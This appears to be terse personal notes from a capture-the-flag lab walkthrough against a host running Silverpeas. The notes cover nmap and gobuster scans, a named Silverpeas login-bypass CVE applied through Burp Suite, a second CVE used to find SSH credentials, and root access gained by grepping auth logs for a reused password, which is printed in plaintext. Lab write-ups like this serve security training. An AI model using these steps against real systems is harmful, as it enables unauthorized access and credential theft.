# NMAP SCAN
-> nmap -sC -sV 10.10.27.111 

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
|_  256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy
|_http-title: Error
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Sat, 12 Jul 2025 10:57:34 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|_    Connection: close

# GOBUSTER
-> gobuster dir -e -u http://10.10.27.111/ -w /usr/share/wordlists/dirb/common.txt

http://10.10.27.111/assets               (Status: 301) [Size: 178] [--> http://10.10.27.111/assets/]                                                                              
http://10.10.27.111/images               (Status: 301) [Size: 178] [--> http://10.10.27.111 images/]                                                                              
http://10.10.27.111/index.html           (Status: 200) [Size: 14124]

## explore assets
-> gobuster dir -e -u http://10.10.27.111/assets/ -w /usr/share/wordlists/dirb/common.txt

http://10.10.27.111/assets/css                  (Status: 301) [Size: 178] [--> http://10.10.27.111/assets/css/]
http://10.10.27.111/assets/js                   (Status: 301) [Size: 178] [--> http://10.10.27.111/assets/js/]

## explore assets/js
-> gobuster dir -u http://10.10.27.111/assets/js/ -w /usr/share/wordlists/dirb/common.txt -x js
/main.js              (Status: 200) [Size: 8435]
/util.js              (Status: 200) [Size: 12433]

# REVIEW FILES
-> curl http://10.10.27.111/index.html -o index.html
-> curl http://10.10.27.111/assets/js/main.js -o main.js  
-> curl http://10.10.27.111/assets/js/util.js -o util.js

**they use silverpeas**

# GO ON PORT 8080
-> gobuster dir -e -u http://10.10.27.111:8080/ -w /usr/share/wordlists/dirb/common.txt
http://10.10.27.111:8080/console              (Status: 302) [Size: 0] [--> /noredirect.html]
http://10.10.27.111:8080/website              (Status: 302) [Size: 0] [--> http://10.10.27.111:8080/website/]

nothing util

-> look for silverpeas
http://10.10.27.111:8080/silverpeas/defaultLogin.jsp

**vulnerablity**: https://nvd.nist.gov/vuln/detail/CVE-2024-36042

# intercept login on silverpeas with BURPSUITE
used burpsuite proxy to intercept post request to silverpeas and applied the vulnerability

now we have access to silverpeas admin panel

# FIND SSH CREDS
https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47320

# ESCALATE PRIVILIGES
-> id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)

-> cat /var/log/auth* | grep -i pass
Jul 12 14:03:34 silver-platter sshd[2086]: Accepted password for tim from 10.21.217.122 port 36000 ssh2
May  8 08:58:40 silver-platter sshd[1710]: Accepted password for tyler from 192.168.1.20 port 42258 ssh2
May  8 14:00:53 silver-platter sshd[1946]: Accepted password for tyler from 192.168.1.20 port 55742 ssh2
Dec 12 19:34:40 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/passwd tim
Dec 12 19:34:46 silver-platter passwd[1576]: pam_unix(passwd:chauthtok): password changed for tim
Dec 12 19:39:15 silver-platter sudo:    tyler : 3 incorrect password attempts ; TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/apt install nginx
Dec 13 15:39:07 silver-platter usermod[1597]: change user 'dnsmasq' password
Dec 13 15:39:07 silver-platter chage[1604]: changed password expiry for dnsmasq
Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
Dec 13 15:44:30 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database sivlerpeas:silverpeas-6.3.1
Dec 13 15:45:21 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
Dec 13 15:45:57 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
Dec 13 16:17:21 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/bin/passwd tim
Dec 13 16:17:31 silver-platter passwd[6811]: pam_unix(passwd:chauthtok): password changed for tim
Dec 13 16:18:57 silver-platter sshd[6879]: Accepted password for tyler from 192.168.1.20 port 47772 ssh2
Dec 13 16:32:41 silver-platter sudo:    tyler : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/passwd tim
Dec 13 16:32:54 silver-platter passwd[7174]: pam_unix(passwd:chauthtok): password changed for tim
Dec 13 16:33:12 silver-platter sshd[7181]: Accepted password for tim from 192.168.1.20 port 50970 ssh2
Dec 13 16:35:45 silver-platter sshd[7297]: Accepted password for tyler from 192.168.1.20 port 58172 ssh2
Dec 13 16:45:33 silver-platter sshd[7622]: Accepted password for tyler from 192.168.1.20 port 33484 ssh2
Dec 13 17:43:09 silver-platter sshd[7750]: Accepted password for tyler from 192.168.1.20 port 45796 ssh2
Dec 13 17:51:30 silver-platter sshd[1370]: Accepted password for tyler from 192.168.1.20 port 60860 ssh2
Dec 13 17:51:41 silver-platter sshd[1681]: Accepted password for tyler from 192.168.1.20 port 55392 ssh2


**found tyler pwd: DB_PASSWORD=_Zd_zx7N823/**

# ACCESS TO TYLER
-> su tyler

access to tyler

-> sudo su

done!
